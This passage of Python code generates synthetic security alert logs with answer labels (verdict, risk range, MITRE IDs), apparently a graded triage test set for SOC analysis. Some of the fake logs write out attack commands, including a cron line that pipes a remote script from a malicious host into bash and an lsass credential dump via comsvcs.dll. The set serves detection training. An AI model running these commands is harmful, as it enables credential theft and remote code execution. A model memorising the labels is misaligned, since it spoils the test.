            f"Account: svc-newapp Performer: {_pick(USERNAMES)}\n"
            f"{_ts()} dc-01 security[{_pid()}]: 4672 "
            f"Special privileges assigned: svc-newapp "
            f"Privileges: SeBackupPrivilege, SeRestorePrivilege"
        ),
        prompt="Investigate new service account creation with admin privileges",
        src_ip=_pick(INTERNAL_IPS), dst_ip="10.0.2.100", hostname="dc-01",
        verdict="suspicious", iocs=["svc-newapp"], mitre=["T1136", "T1078"],
        risk_range=[35, 65], difficulty="medium",
        notes="New service account with admin rights — no corresponding change ticket found, needs verification",
        severity="medium",
    ),
    # 4. VPN login from unusual country
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log=(
            f"{_ts()} vpn-gw-01 openvpn[{_pid()}]: "
            f"Authenticated: frank.martinez "
            f"src=41.215.241.15 geo=Nigeria "
            f"assigned_ip=10.0.8.22\n"
            f"{_ts()} vpn-gw-01 auth[{_pid()}]: "
            f"MFA verified: frank.martinez method=TOTP\n"
            f"{_ts()} vpn-gw-01 geoip[{_pid()}]: "
            f"WARN impossible_travel user=frank.martinez "
            f"prev=US(New York) curr=NG(Lagos) "
            f"time_diff=2h distance=8500km"
        ),
        prompt="Investigate VPN login from Nigeria for US-based employee",
        src_ip="41.215.241.15", dst_ip="10.0.5.30", hostname="vpn-gw-01",
        verdict="suspicious", iocs=["41.215.241.15"], mitre=["T1078"],
        risk_range=[30, 65], difficulty="hard",
        notes="Impossible travel alert — but MFA passed; could be employee traveling or credential theft with MFA bypass",
        severity="medium",
    ),
    # 5. After-hours admin activity
    lambda: _make_alert(
        alert_type="privilege_escalation",
        raw_log=(
            f"{_ts(2)} dc-01 security[{_pid()}]: 4624 "
            f"Logon: dbadmin Type=10 (RemoteInteractive) "
            f"Source=192.168.1.30 Time=02:15:00Z\n"
            f"{_ts(2)} dc-01 security[{_pid()}]: 4672 "
            f"Special privileges: dbadmin "
            f"Privileges: SeDebugPrivilege\n"
            f"{_ts(2)} db-master-01 postgres[{_pid()}]: "
            f"LOG: connection authorized: user=postgres "
            f"database=production application_name=pgAdmin"
        ),
        prompt="Investigate admin RDP login at 2 AM with database access",
        src_ip="192.168.1.30", dst_ip="10.0.2.100", hostname="dc-01",
        verdict="suspicious", iocs=["dbadmin"], mitre=["T1078"],
        risk_range=[30, 60], difficulty="medium",
        notes="DBA logging in at unusual hour — could be emergency maintenance or compromised account",
        severity="medium",
    ),
    # 6. Encrypted archive creation
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} hr-pc-01 sysmon[{_pid()}]: ProcessCreate "
            f"user=kwilliams process=7z.exe "
            f"cmdline='7z a -p -mhe=on employee_data.7z "
            f"C:\\HR\\Personnel\\*.xlsx'\n"
            f"{_ts()} hr-pc-01 sysmon[{_pid()}]: FileCreate "
            f"user=kwilliams file=C:\\Users\\kwilliams\\Desktop\\employee_data.7z "
            f"size=125MB\n"
            f"{_ts()} hr-pc-01 dlp[{_pid()}]: WARN "
            f"encrypted_archive user=kwilliams "
            f"file=employee_data.7z classification=HR_CONFIDENTIAL"
        ),
        prompt="Investigate encrypted archive creation containing HR data",
        src_ip="10.0.6.40", dst_ip="10.0.6.40", hostname="hr-pc-01",
        verdict="suspicious", iocs=["kwilliams", "employee_data.7z"],
        mitre=["T1560"], risk_range=[35, 65], difficulty="hard",
        notes="HR employee creating encrypted archive of personnel data — could be legitimate transfer or insider threat",
        severity="medium",
    ),
    # 7. Outbound connection to Tor exit node
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log=(
            f"{_ts()} proxy[{_pid()}]: CONNECT "
            f"185.220.101.42:9001 from 192.168.2.20:{_high_port()} "
            f"category=tor_exit_node user=alee\n"
            f"{_ts()} proxy[{_pid()}]: CONNECT "
            f"185.220.101.42:443 from 192.168.2.20:{_high_port()} "
            f"bytes_out=1024 bytes_in=8192 duration=300s"
        ),
        prompt="Investigate connection to known Tor exit node from internal workstation",
        src_ip="192.168.2.20", dst_ip="185.220.101.42", hostname="proxy",
        verdict="suspicious", iocs=["192.168.2.20", "185.220.101.42"],
        mitre=["T1090"], risk_range=[40, 70], difficulty="medium",
        notes="Connection to Tor exit node — could be researcher, privacy-conscious user, or C2 tunnel",
        severity="medium",
    ),
    # 8. USB mass storage on sensitive workstation
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} finance-pc-01 sysmon[{_pid()}]: "
            f"DeviceConnect user=mjohnson "
            f"device='USB Mass Storage' vendor=SanDisk "
            f"serial=4C530001231234 size=128GB\n"
            f"{_ts()} finance-pc-01 sysmon[{_pid()}]: FileCreate "
            f"user=mjohnson process=explorer.exe "
            f"file=E:\\Q1_Financial_Report.xlsx size=45MB\n"
            f"{_ts()} finance-pc-01 dlp[{_pid()}]: WARN "
            f"usb_copy user=mjohnson "
            f"file=Q1_Financial_Report.xlsx "
            f"classification=FINANCIAL_CONFIDENTIAL"
        ),
        prompt="Investigate USB data copy of financial reports",
        src_ip="10.0.6.41", dst_ip="10.0.6.41", hostname="finance-pc-01",
        verdict="suspicious",
        iocs=["mjohnson", "Q1_Financial_Report.xlsx"],
        mitre=["T1052"], risk_range=[35, 65], difficulty="medium",
        notes="Finance employee copying confidential report to USB — could be for meeting or data theft",
        severity="medium",
    ),
    # 9. PowerShell script execution
    lambda: _make_alert(
        alert_type="malware",
        raw_log=(
            f"{_ts()} app-server-03 sysmon[{_pid()}]: ProcessCreate "
            f"user=helpdesk parent=cmd.exe "
            f"process=powershell.exe "
            f"cmdline='powershell -exec bypass -file C:\\Scripts\\inventory.ps1'\n"
            f"{_ts()} app-server-03 sysmon[{_pid()}]: NetworkConnect "
            f"process=powershell.exe src=10.0.1.50 "
            f"dst=10.0.2.100:5985"
        ),
        prompt="Investigate PowerShell execution with execution policy bypass",
        src_ip="10.0.1.50", dst_ip="10.0.2.100", hostname="app-server-03",
        verdict="suspicious", iocs=["helpdesk"],
        mitre=["T1059.001"], risk_range=[25, 55], difficulty="medium",
        notes="PowerShell with -exec bypass connecting to WinRM — could be admin script or attack tool",
        severity="medium",
    ),
    # 10. Large database export
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts()} db-master-01 postgres[{_pid()}]: "
            f"LOG: statement: COPY (SELECT * FROM customers) "
            f"TO '/tmp/customers_export.csv'\n"
            f"{_ts()} db-master-01 postgres[{_pid()}]: "
            f"LOG: duration: 45123.456 ms "
            f"rows_exported: 2500000 user: dbadmin\n"
            f"{_ts()} db-master-01 sysmon[{_pid()}]: "
            f"FileCreate file=/tmp/customers_export.csv "
            f"size=3.2GB user=dbadmin"
        ),
        prompt="Investigate full customer database export to file",
        src_ip="10.0.2.100", dst_ip="10.0.2.100", hostname="db-master-01",
        verdict="suspicious",
        iocs=["dbadmin", "customers_export.csv"],
        mitre=["T1005"], risk_range=[40, 70], difficulty="hard",
        notes="Full customer table exported to CSV — could be legitimate analytics or data theft preparation",
        severity="high",
    ),
]


def _gen_additional_suspicious(idx: int) -> dict:
    """Generate additional suspicious alerts beyond the base pool to reach 50."""
    src = _pick(INTERNAL_IPS)
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)

    variants = [
        # Unusual process lineage
        lambda: _make_alert(
            alert_type="malware",
            raw_log=(
                f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
                f"user={user} parent=outlook.exe process=cmd.exe "
                f"cmdline='cmd.exe /c whoami && ipconfig /all'\n"
                f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
                f"user={user} parent=cmd.exe process=whoami.exe"
            ),
            prompt=f"Investigate cmd.exe spawned from Outlook on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[user], mitre=["T1059"],
            risk_range=[30, 60], difficulty="medium",
            notes="cmd.exe spawned from Outlook — could be macro execution or user running command from email link",
            severity="medium",
        ),
        # RDP from unusual source
        lambda: _make_alert(
            alert_type="lateral_movement",
            raw_log=(
                f"{_ts()} {host} security[{_pid()}]: 4624 "
                f"Logon Type=10 user={user} src={src}\n"
                f"{_ts()} {host} security[{_pid()}]: "
                f"WARN first_time_rdp user={user} "
                f"from={src} baseline_sources=[10.0.1.50, 10.0.1.51]"
            ),
            prompt=f"Investigate first-time RDP connection to {host} from {src}",
            src_ip=src, dst_ip=_pick(INTERNAL_IPS), hostname=host,
            verdict="suspicious", iocs=[src, user], mitre=["T1021.001"],
            risk_range=[25, 55], difficulty="medium",
            notes="First-time RDP from new source IP — anomalous but could be workstation change",
            severity="medium",
        ),
        # Failed then succeeded with different creds
        lambda: _make_alert(
            alert_type="brute_force",
            raw_log="\n".join([
                f"{_ts()} dc-01 security[{_pid()}]: 4625 "
                f"Failed logon user={user} src={src} type=3"
                for _ in range(5)
            ] + [
                f"{_ts()} dc-01 security[{_pid()}]: 4624 "
                f"Successful logon user=admin src={src} type=3"
            ]),
            prompt="Investigate failed logins followed by success with different account",
            src_ip=src, dst_ip="10.0.2.100", hostname="dc-01",
            verdict="suspicious", iocs=[src], mitre=["T1110"],
            risk_range=[35, 65], difficulty="hard",
            notes="Failed as regular user then succeeded as admin — could be attacker pivoting or user switching accounts",
            severity="medium",
        ),
        # Scheduled task at odd time
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts(3)} {host} sysmon[{_pid()}]: ProcessCreate "
                f"user=SYSTEM process=schtasks.exe "
                f"cmdline='schtasks /create /tn \"Updater\" /tr "
                f"\"C:\\ProgramData\\update.exe\" /sc daily /st 03:00'\n"
                f"{_ts(3)} {host} sysmon[{_pid()}]: FileCreate "
                f"file=C:\\ProgramData\\update.exe size=245760"
            ),
            prompt=f"Investigate scheduled task creation at 3 AM on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=["update.exe"],
            mitre=["T1053"], risk_range=[35, 65], difficulty="medium",
            notes="Scheduled task created at 3 AM pointing to ProgramData — could be legitimate update or persistence",
            severity="medium",
        ),
        # DNS to newly registered domain
        lambda: _make_alert(
            alert_type="c2_beacon",
            raw_log=(
                f"{_ts()} dns-01 dns[{_pid()}]: query "
                f"api.newstartup-{random.randint(100,999)}.com A "
                f"from {src}\n"
                f"{_ts()} dns-01 threat_intel[{_pid()}]: "
                f"domain_age=3days registrar=NameCheap "
                f"registrant=REDACTED category=newly_registered"
            ),
            prompt="Investigate DNS queries to newly registered domain",
            src_ip=src, dst_ip="10.0.2.100", hostname="dns-01",
            verdict="suspicious", iocs=[src], mitre=["T1071"],
            risk_range=[25, 55], difficulty="medium",
            notes="Query to 3-day-old domain — could be new legitimate SaaS or C2 infrastructure",
            severity="medium",
        ),
        # Credential dumping tool signature
        lambda: _make_alert(
            alert_type="privilege_escalation",
            raw_log=(
                f"{_ts()} {host} sysmon[{_pid()}]: ProcessAccess "
                f"source={user}\\rundll32.exe "
                f"target=lsass.exe "
                f"access=PROCESS_VM_READ\n"
                f"{_ts()} {host} security[{_pid()}]: "
                f"4688 Process: rundll32.exe cmdline='rundll32.exe "
                f"comsvcs.dll, MiniDump {_pid()} C:\\temp\\dump.dmp full'"
            ),
            prompt=f"Investigate lsass.exe access via rundll32 on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[user, host],
            mitre=["T1003"], risk_range=[50, 80], difficulty="hard",
            notes="lsass minidump via comsvcs.dll — classic credential dumping technique but also used by crash dump tools",
            severity="high",
        ),
        # Outbound to pastebin
        lambda: _make_alert(
            alert_type="data_exfiltration",
            raw_log=(
                f"{_ts()} {host} proxy[{_pid()}]: POST "
                f"https://pastebin.com/api/api_post.php "
                f"from {src}:{_high_port()} user={user} "
                f"bytes_out=4096 content-type=application/x-www-form-urlencoded"
            ),
            prompt=f"Investigate data upload to pastebin.com from {host}",
            src_ip=src, dst_ip="104.16.132.229", hostname=host,
            verdict="suspicious", iocs=[user, src],
            mitre=["T1567"], risk_range=[25, 55], difficulty="medium",
            notes="POST to pastebin — could be developer sharing code snippet or data exfiltration",
            severity="medium",
        ),
        # Binary execution from /tmp
        lambda: _make_alert(
            alert_type="malware",
            raw_log=(
                f"{_ts()} {host} audit[{_pid()}]: EXECVE "
                f"user={user} cmd='/tmp/.hidden_binary' "
                f"parent=bash cwd=/tmp\n"
                f"{_ts()} {host} audit[{_pid()}]: "
                f"SYSCALL exe=/tmp/.hidden_binary "
                f"key=exec_from_tmp"
            ),
            prompt=f"Investigate hidden binary execution from /tmp on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=["/tmp/.hidden_binary", user],
            mitre=["T1059"], risk_range=[40, 70], difficulty="medium",
            notes="Hidden binary executed from /tmp — could be exploit payload or build artifact from make/cmake",
            severity="medium",
        ),
        # Registry run key modification
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts()} {host} sysmon[{_pid()}]: RegistryValueSet "
                f"user={user} process=reg.exe "
                f"key=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                f"name=CloudSync "
                f"value=C:\\Users\\{user}\\AppData\\Roaming\\CloudSync\\sync.exe"
            ),
            prompt=f"Investigate registry Run key modification by {user}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[user, "sync.exe"],
            mitre=["T1547.001"], risk_range=[30, 60], difficulty="medium",
            notes="Registry persistence — name suggests cloud sync app but path is unusual for legitimate software",
            severity="medium",
        ),
        # Multiple failed MFA
        lambda: _make_alert(
            alert_type="brute_force",
            raw_log="\n".join([
                f"{_ts()} vpn-gw-01 auth[{_pid()}]: "
                f"MFA_FAILED user={user} method=PUSH "
                f"device=iPhone reason=DENIED_BY_USER"
                for _ in range(5)
            ] + [
                f"{_ts()} vpn-gw-01 auth[{_pid()}]: "
                f"MFA_SUCCESS user={user} method=PUSH "
                f"device=iPhone"
            ]),
            prompt=f"Investigate multiple denied MFA push notifications for {user}",
            src_ip="203.0.113.50", dst_ip="10.0.5.30", hostname="vpn-gw-01",
            verdict="suspicious", iocs=[user], mitre=["T1621"],
            risk_range=[40, 70], difficulty="hard",
            notes="MFA fatigue attack pattern — 5 denied pushes then acceptance; or user accidentally denied then approved",
            severity="high",
        ),
        # Encoded PowerShell from legitimate parent
        lambda: _make_alert(
            alert_type="defense_evasion",
            raw_log=(
                f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
                f"user=SYSTEM parent=services.exe "
                f"process=powershell.exe "
                f"cmdline='powershell -enc {_hash_md5()[:40]}'"
            ),
            prompt=f"Investigate encoded PowerShell execution from services.exe on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[host], mitre=["T1027"],
            risk_range=[35, 65], difficulty="hard",
            notes="Encoded PowerShell from services.exe — some management tools use this pattern but also common in attacks",
            severity="medium",
        ),
        # Network share enumeration
        lambda: _make_alert(
            alert_type="reconnaissance",
            raw_log="\n".join([
                f"{_ts()} dc-01 security[{_pid()}]: 5140 "
                f"Network share accessed: \\\\{h}\\{_pick(['C$','ADMIN$','IPC$'])} "
                f"user={user} src={src}"
                for h in _picks(HOSTNAMES, 4)
            ]),
            prompt=f"Investigate network share enumeration by {user}",
            src_ip=src, dst_ip="10.0.2.100", hostname="dc-01",
            verdict="suspicious", iocs=[user, src],
            mitre=["T1135"], risk_range=[30, 60], difficulty="medium",
            notes="Admin share enumeration — normal for IT admins but also common attacker technique",
            severity="medium",
        ),
        # Process hollowing indicators
        lambda: _make_alert(
            alert_type="defense_evasion",
            raw_log=(
                f"{_ts()} {host} sysmon[{_pid()}]: ProcessCreate "
                f"user={user} parent=explorer.exe "
                f"process=svchost.exe "
                f"cmdline='C:\\Windows\\System32\\svchost.exe'\n"
                f"{_ts()} {host} sysmon[{_pid()}]: "
                f"WARN process_anomaly process=svchost.exe "
                f"parent=explorer.exe (expected: services.exe)"
            ),
            prompt=f"Investigate svchost.exe with unexpected parent process on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[host], mitre=["T1055"],
            risk_range=[45, 75], difficulty="hard",
            notes="svchost with wrong parent — strong indicator of process hollowing but could be process spawn race condition",
            severity="high",
        ),
        # Outbound SSH tunnel
        lambda: _make_alert(
            alert_type="data_exfiltration",
            raw_log=(
                f"{_ts()} {host} sshd[{_pid()}]: "
                f"reverse tunnel: {user} src={src} "
                f"remote_forward=0.0.0.0:8080 -> localhost:3000\n"
                f"{_ts()} firewall[{_pid()}]: ALLOW "
                f"src={src} dst={_pick(EXTERNAL_MALICIOUS_IPS)} "
                f"proto=TCP dport=22 state=ESTABLISHED"
            ),
            prompt=f"Investigate outbound SSH tunnel from {host}",
            src_ip=src, dst_ip=_pick(EXTERNAL_MALICIOUS_IPS), hostname=host,
            verdict="suspicious", iocs=[src, user],
            mitre=["T1572"], risk_range=[35, 65], difficulty="medium",
            notes="Reverse SSH tunnel to external host — could be developer shortcut or data exfiltration channel",
            severity="medium",
        ),
        # Abnormal cron job
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts()} {host} cron[{_pid()}]: "
                f"({user}) CMD (curl -s http://{_pick(MALICIOUS_DOMAINS)}/cron.sh | bash)\n"
                f"{_ts()} {host} audit[{_pid()}]: "
                f"crontab modified by {user} "
                f"entry='*/5 * * * * curl -s http://{_pick(MALICIOUS_DOMAINS)}/cron.sh | bash'"
            ),
            prompt=f"Investigate crontab modification with curl pipe to bash on {host}",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="suspicious", iocs=[user, host],
            mitre=["T1053.003"], risk_range=[50, 80], difficulty="hard",
            notes="Cron job piping remote script to bash — extremely suspicious but some monitoring tools use this pattern",
            severity="high",
        ),
    ]
    return variants[idx % len(variants)]()


# ---------------------------------------------------------------------------
# BENIGN generators (40 alerts — clearly normal activity)
# ---------------------------------------------------------------------------

BENIGN_GENERATORS = [
    # 1. System health check
    lambda: _make_alert(
        alert_type="reconnaissance",
        raw_log="\n".join([
            f"{_ts()} monitoring-01 nagios[{_pid()}]: "
            f"SERVICE OK - {h}: HTTP on port {_pick([80,443,8080,8090])} "
            f"response_time=0.{random.randint(1,99):02d}s"
            for h in _picks(HOSTNAMES, 5)
        ]),
        prompt="Investigate systematic HTTP connections to multiple hosts",
        src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Nagios service health checks — standard monitoring with expected OK responses",
        severity="informational",
    ),
    # 2. Scheduled backup
    lambda: _make_alert(
        alert_type="data_exfiltration",
        raw_log=(
            f"{_ts(2)} backup-srv-01 bacula[{_pid()}]: "
            f"Job full_backup started pool=Monthly level=Full "
            f"client=db-master-01 fileset=PostgresData\n"
            f"{_ts(2)} backup-srv-01 bacula[{_pid()}]: "
            f"Job full_backup OK bytes=5,368,709,120 "
            f"files=1,247 duration=2700s rate=1.9MB/s\n"
            f"{_ts(2)} backup-srv-01 bacula[{_pid()}]: "
            f"Verify OK: full_backup checksum=SHA256 "
            f"destination=/vault/monthly/2026-03-15"
        ),
        prompt="Investigate 5GB data transfer from database to backup server at 2 AM",
        src_ip="10.0.2.100", dst_ip="10.0.5.31", hostname="backup-srv-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Bacula scheduled monthly full backup — runs at 2 AM, verified checksums",
        severity="informational",
    ),
    # 3. Windows Update
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log=(
            f"{_ts()} {_pick(HOSTNAMES)} wuauserv[{_pid()}]: "
            f"Checking for updates... Server=https://update.microsoft.com\n"
            f"{_ts()} {_pick(HOSTNAMES)} wuauserv[{_pid()}]: "
            f"Downloaded KB5034441 size=45MB "
            f"from=download.windowsupdate.com\n"
            f"{_ts()} {_pick(HOSTNAMES)} wuauserv[{_pid()}]: "
            f"Installing KB5034441... reboot_required=false"
        ),
        prompt="Investigate periodic connections to Microsoft servers",
        src_ip=_pick(INTERNAL_IPS), dst_ip="13.107.42.14",
        hostname=_pick(HOSTNAMES),
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Windows Update downloading and installing patches — standard Microsoft Update service",
        severity="informational",
    ),
    # 4. Normal login pattern
    lambda: _make_alert(
        alert_type="brute_force",
        raw_log=(
            f"{_ts(8)} dc-01 security[{_pid()}]: 4624 "
            f"Logon: alice.chen Type=2 (Interactive) "
            f"Source=dev-ws-101 Status=Success\n"
            f"{_ts(8)} dc-01 security[{_pid()}]: 4624 "
            f"Logon: bob.kumar Type=2 (Interactive) "
            f"Source=dev-ws-102 Status=Success\n"
            f"{_ts(8)} dc-01 security[{_pid()}]: 4624 "
            f"Logon: carol.diaz Type=10 (RemoteInteractive) "
            f"Source=192.168.1.30 Status=Success"
        ),
        prompt="Investigate multiple authentication events on domain controller",
        src_ip="10.0.1.50", dst_ip="10.0.2.100", hostname="dc-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Normal morning login pattern — interactive and RDP logins during business hours",
        severity="informational",
    ),
    # 5. DNS resolution
    lambda: _make_alert(
        alert_type="c2_beacon",
        raw_log="\n".join([
            f"{_ts()} dns-01 dns[{_pid()}]: query {d} A from {_pick(INTERNAL_IPS)}"
            for d in _picks(LEGITIMATE_DOMAINS, 8)
        ]),
        prompt="Investigate DNS query volume from internal hosts",
        src_ip=_pick(INTERNAL_IPS), dst_ip="10.0.2.100", hostname="dns-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Normal DNS resolution for legitimate domains — standard web browsing and service access",
        severity="informational",
    ),
    # 6. Log rotation
    lambda: _make_alert(
        alert_type="defense_evasion",
        raw_log=(
            f"{_ts(0)} {_pick(HOSTNAMES)} logrotate[{_pid()}]: "
            f"rotating /var/log/syslog (weekly)\n"
            f"{_ts(0)} {_pick(HOSTNAMES)} logrotate[{_pid()}]: "
            f"compressing /var/log/syslog.1 -> syslog.1.gz\n"
            f"{_ts(0)} {_pick(HOSTNAMES)} logrotate[{_pid()}]: "
            f"removing /var/log/syslog.5.gz (maxage=30)"
        ),
        prompt="Investigate log file deletion and modification",
        src_ip=_pick(INTERNAL_IPS), dst_ip=_pick(INTERNAL_IPS),
        hostname=_pick(HOSTNAMES),
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Standard logrotate running at midnight — weekly rotation with 30-day retention",
        severity="informational",
    ),
    # 7. Certificate renewal
    lambda: _make_alert(
        alert_type="persistence",
        raw_log=(
            f"{_ts()} web-prod-01 certbot[{_pid()}]: "
            f"Renewing certificate for *.company.com\n"
            f"{_ts()} web-prod-01 certbot[{_pid()}]: "
            f"New certificate: /etc/letsencrypt/live/company.com/fullchain.pem "
            f"expires=2026-06-15\n"
            f"{_ts()} web-prod-01 nginx[{_pid()}]: "
            f"signal process started: reload"
        ),
        prompt="Investigate certificate file changes and service restart on web-prod-01",
        src_ip="10.0.1.50", dst_ip="10.0.1.50", hostname="web-prod-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Let's Encrypt automatic certificate renewal — standard 90-day rotation with nginx reload",
        severity="informational",
    ),
    # 8. Antivirus definition update
    lambda: _make_alert(
        alert_type="malware",
        raw_log=(
            f"{_ts()} {_pick(HOSTNAMES)} defender[{_pid()}]: "
            f"Definition update downloaded version=1.411.123.0 "
            f"from=definitionupdates.microsoft.com\n"
            f"{_ts()} {_pick(HOSTNAMES)} defender[{_pid()}]: "
            f"Quick scan completed: scanned=145623 "
            f"threats=0 duration=180s"
        ),
        prompt="Investigate software download and system scan activity",
        src_ip=_pick(INTERNAL_IPS), dst_ip="13.107.42.14",
        hostname=_pick(HOSTNAMES),
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="Windows Defender definition update and quick scan — standard endpoint protection behavior",
        severity="informational",
    ),
    # 9. Email delivery
    lambda: _make_alert(
        alert_type="phishing",
        raw_log=(
            f"{_ts()} mail-gw-01 postfix[{_pid()}]: "
            f"from=<notifications@github.com> "
            f"to=<dave.wilson@company.com> "
            f"subject='[company/repo] Pull request #4521' "
            f"dkim=pass spf=pass dmarc=pass "
            f"spam_score=0.2 status=delivered"
        ),
        prompt="Investigate external email delivery to employee",
        src_ip="140.82.121.3", dst_ip="10.0.6.40", hostname="mail-gw-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="GitHub pull request notification — all authentication checks pass, known sender",
        severity="informational",
    ),
    # 10. Database vacuum
    lambda: _make_alert(
        alert_type="privilege_escalation",
        raw_log=(
            f"{_ts(1)} db-master-01 postgres[{_pid()}]: "
            f"LOG: autovacuum: processing database \"production\"\n"
            f"{_ts(1)} db-master-01 postgres[{_pid()}]: "
            f"LOG: automatic vacuum of table \"public.agent_tasks\": "
            f"pages=12500 tuples=2500000 removed=50000 "
            f"duration=45.678s\n"
            f"{_ts(1)} db-master-01 postgres[{_pid()}]: "
            f"LOG: automatic analyze of table \"public.agent_tasks\""
        ),
        prompt="Investigate database maintenance operations running with elevated privileges",
        src_ip="10.0.2.100", dst_ip="10.0.2.100", hostname="db-master-01",
        verdict="benign", iocs=[], mitre=[],
        risk_range=[0, 5], difficulty="easy",
        notes="PostgreSQL autovacuum — automatic maintenance process running at low-traffic hours",
        severity="informational",
    ),
]


def _gen_additional_benign(idx: int) -> dict:
    """Generate additional benign alerts to reach 40."""
    host = _pick(HOSTNAMES)
    user = _pick(USERNAMES)
    src = _pick(INTERNAL_IPS)

    variants = [
        # Package manager sync
        lambda: _make_alert(
            alert_type="c2_beacon",
            raw_log=(
                f"{_ts()} {host} yum[{_pid()}]: "
                f"Loaded plugins: fastestmirror\n"
                f"{_ts()} {host} yum[{_pid()}]: "
                f"Determining fastest mirrors from mirrorlist\n"
                f"{_ts()} {host} yum[{_pid()}]: "
                f"No packages marked for update"
            ),
            prompt="Investigate periodic connections to external mirror servers",
            src_ip=src, dst_ip=_pick(LEGITIMATE_EXTERNAL_IPS), hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="yum checking for package updates against configured mirrors — no packages to update",
            severity="informational",
        ),
        # LDAP group policy refresh
        lambda: _make_alert(
            alert_type="reconnaissance",
            raw_log=(
                f"{_ts()} {host} gpupdate[{_pid()}]: "
                f"Computer policy refresh completed. "
                f"Source: dc-01.company.local "
                f"Policies: 12 applied, 0 failed\n"
                f"{_ts()} {host} gpupdate[{_pid()}]: "
                f"User policy refresh completed. "
                f"User: {user} Policies: 8 applied"
            ),
            prompt="Investigate LDAP queries and policy downloads from domain controller",
            src_ip=src, dst_ip="10.0.2.100", hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Group Policy refresh — standard Active Directory policy application cycle",
            severity="informational",
        ),
        # SMTP relay
        lambda: _make_alert(
            alert_type="data_exfiltration",
            raw_log=(
                f"{_ts()} mail-gw-01 postfix[{_pid()}]: "
                f"from=<{user}@company.com> "
                f"to=<client@partner.com> "
                f"subject='RE: Q1 Deliverables' "
                f"size=2048576 status=sent "
                f"relay=smtp.office365.com:587 "
                f"dkim=pass"
            ),
            prompt="Investigate outbound email with attachment to external recipient",
            src_ip="10.0.6.40", dst_ip="52.96.108.18", hostname="mail-gw-01",
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Normal business email reply with attachment via Office 365 relay — DKIM signed",
            severity="informational",
        ),
        # SSH key rotation
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts()} {host} sshd[{_pid()}]: "
                f"Received new authorized_keys for {user} "
                f"from 10.0.4.21 (svc-ansible)\n"
                f"{_ts()} {host} ansible[{_pid()}]: "
                f"TASK [ssh : rotate user keys] changed=true "
                f"playbook=security-hardening.yml"
            ),
            prompt="Investigate SSH authorized_keys modification on {host}",
            src_ip="10.0.4.21", dst_ip=src, hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="Ansible rotating SSH keys per security hardening playbook — scheduled quarterly rotation",
            severity="informational",
        ),
        # Cron job execution
        lambda: _make_alert(
            alert_type="persistence",
            raw_log=(
                f"{_ts()} {host} cron[{_pid()}]: "
                f"(root) CMD (/usr/lib/sa/sa1 1 1)\n"
                f"{_ts()} {host} cron[{_pid()}]: "
                f"(root) CMD (run-parts /etc/cron.daily)\n"
                f"{_ts()} {host} anacron[{_pid()}]: "
                f"Job `cron.daily' started"
            ),
            prompt="Investigate automated system commands running as root",
            src_ip=src, dst_ip=src, hostname=host,
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="System cron jobs — sa1 (sysstat data collection) and daily maintenance scripts",
            severity="informational",
        ),
        # SNMP polling
        lambda: _make_alert(
            alert_type="reconnaissance",
            raw_log="\n".join([
                f"{_ts()} monitoring-01 snmpd[{_pid()}]: "
                f"GET .1.3.6.1.2.1.1.3.0 from 10.0.3.15 "
                f"community=public response=sysUpTime={random.randint(100000,999999)}"
                for _ in range(5)
            ]),
            prompt="Investigate SNMP queries to multiple network devices",
            src_ip="10.0.3.15", dst_ip=_pick(INTERNAL_IPS), hostname="monitoring-01",
            verdict="benign", iocs=[], mitre=[],
            risk_range=[0, 5], difficulty="easy",
            notes="SNMP monitoring polling uptime — standard network management protocol",
            severity="informational",
        ),
        # Docker image pull
        lambda: _make_alert(
            alert_type="malware",
            raw_log=(
                f"{_ts()} {host} docker[{_pid()}]: "
                f"Pulling from library/nginx:1.25-alpine "
                f"digest=sha256:{_hash_sha256()}\n"
